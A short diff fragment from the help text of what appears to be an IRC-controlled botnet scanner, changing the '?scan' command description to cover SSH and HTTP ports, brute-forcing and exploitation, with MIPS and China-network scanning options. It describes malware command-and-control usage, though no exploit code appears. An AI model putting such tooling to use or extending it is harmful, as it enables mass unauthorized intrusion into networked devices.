@@ -31,7 +31,7 @@ SCAN FUNCTION:
 	
 	# Mark: The square brackets of IRC username is very very important for "?autoscan" command!!!
 
-	?scan <network> <default> <mips>                	Scan default SSH port on network, brute-force attack and exploit to the target.
+	?scan <network> <default> <mips>                	Scan default SSH and HTTP port on network, brute-force attack and exploit to the target.
 	?autoscan <network> <default> <mips> <username>		Auto scan command avaible for IRC channel topic only!!!
 
 		-cn		Scan on china network.
